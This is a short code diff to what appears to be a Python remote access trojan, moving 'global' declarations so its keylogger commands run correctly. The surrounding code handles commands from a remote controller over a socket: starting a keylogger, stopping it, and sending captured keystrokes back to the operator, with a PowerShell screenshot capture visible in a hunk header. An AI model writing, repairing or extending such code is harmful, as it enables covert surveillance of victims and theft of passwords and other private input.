@@ -1782,8 +1782,8 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     # --- Enhanced Keylogger ---
+                    global keylogger_active, keylog_buffer
                     if command.lower() == 'keylog_start':
-                        global keylogger_active, keylog_buffer
                         if not keylogger_active:
                             keylogger_active = True
                             keylog_buffer = []
@@ -1826,7 +1826,6 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     if command.lower() == 'keylog_dump':
-                        global keylog_buffer
                         if keylog_buffer:
                             logs = ''.join(keylog_buffer)
                             s.send(f"Keylogger Log:\n{logs}\n\n".encode())
@@ -1836,7 +1835,6 @@ $bitmap.Save("$env:TEMP\\screenshot.png")
                         continue
                     
                     if command.lower() == 'keylog_stop':
-                        global keylogger_active
                         keylogger_active = False
                         s.send("[+] Keylogger stopped\n\n".encode())
                         continue
